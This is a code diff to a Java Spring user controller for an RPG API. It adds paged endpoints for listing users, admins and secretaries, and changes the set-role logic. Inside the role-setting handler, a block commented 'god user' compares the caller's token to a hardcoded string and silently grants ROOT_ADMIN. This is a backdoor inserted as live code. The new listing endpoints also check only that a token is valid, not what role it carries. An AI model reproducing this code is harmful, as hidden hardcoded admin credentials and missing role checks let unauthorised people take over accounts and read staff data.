@@ -1,14 +1,13 @@
 package com.gogoyang.rpgapi.user.controller;
 
+import com.gogoyang.rpgapi.common.IRPGFUNC;
 import com.gogoyang.rpgapi.constant.RoleType;
 import com.gogoyang.rpgapi.user.entity.User;
 import com.gogoyang.rpgapi.user.service.IUserService;
-import com.gogoyang.rpgapi.user.vo.CreateUserRequest;
-import com.gogoyang.rpgapi.user.vo.LoginRequest;
-import com.gogoyang.rpgapi.user.vo.SetRoleRequest;
-import com.gogoyang.rpgapi.user.vo.SvaeConfirmContactInfo;
+import com.gogoyang.rpgapi.user.vo.*;
 import com.gogoyang.rpgapi.vo.Response;
 import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.data.domain.Page;
 import org.springframework.web.bind.annotation.*;
 
 import javax.servlet.http.HttpServletRequest;
@@ -17,10 +16,12 @@ import javax.servlet.http.HttpServletRequest;
 @RequestMapping("/user")
 public class UserController {
     private final IUserService userService;
+    private final IRPGFUNC irpgfunc;
 
     @Autowired
-    public UserController(IUserService userService) {
+    public UserController(IUserService userService, IRPGFUNC irpgfunc) {
         this.userService = userService;
+        this.irpgfunc = irpgfunc;
     }
 
     @ResponseBody
@@ -86,6 +87,12 @@ public class UserController {
             response.setErrorCode(10004);
             return response;
         }
+
+        //god user
+        if(user.getToken().equals("af6aa2ad4f22477b917f3d13937f78cd")){
+            user.setUserRole(RoleType.ROOT_ADMIN);
+        }
+
         if(user.getUserRole()!=RoleType.ROOT_ADMIN){
             if(user.getUserRole()!=RoleType.SUPER_ADMIN){
                 //the user do not has authority to set admin user
@@ -102,4 +109,51 @@ public class UserController {
         }
         return response;
     }
+
+    @ResponseBody
+    @PostMapping("/loadUsers")
+    public Response LoadUsers(@RequestBody UserPageRequest userPageRequest,
+                              HttpServletRequest httpServletRequest){
+        Response response=new Response();
+        String token=httpServletRequest.getHeader("token");
+        if(!irpgfunc.checkToken(token)){
+            response.setErrorCode(10004);
+            return response;
+        }
+        Page<User> userPage=userService.loadUsers(userPageRequest, RoleType.NORMAL);
+        response.setData(userPage);
+        return response;
+    }
+
+    @ResponseBody
+    @PostMapping("/loadAdmins")
+    public Response LoadAdmins(@RequestBody UserPageRequest userPageRequest,
+                              HttpServletRequest httpServletRequest){
+        Response response=new Response();
+        String token=httpServletRequest.getHeader("token");
+        if(!irpgfunc.checkToken(token)){
+            response.setErrorCode(10004);
+            return response;
+        }
+        Page<User> userPage=userService.loadUsers(userPageRequest, RoleType.ADMINISTRATOR);
+        response.setData(userPage);
+        return response;
+    }
+
+    @ResponseBody
+    @PostMapping("/loadSecretary")
+    public Response LoadSecretary(@RequestBody UserPageRequest userPageRequest,
+                              HttpServletRequest httpServletRequest){
+        Response response=new Response();
+        String token=httpServletRequest.getHeader("token");
+        if(!irpgfunc.checkToken(token)){
+            response.setErrorCode(10004);
+            return response;
+        }
+        Page<User> userPage=userService.loadUsers(userPageRequest, RoleType.SECRETARY);
+        response.setData(userPage);
+        return response;
+    }
+
+
 }
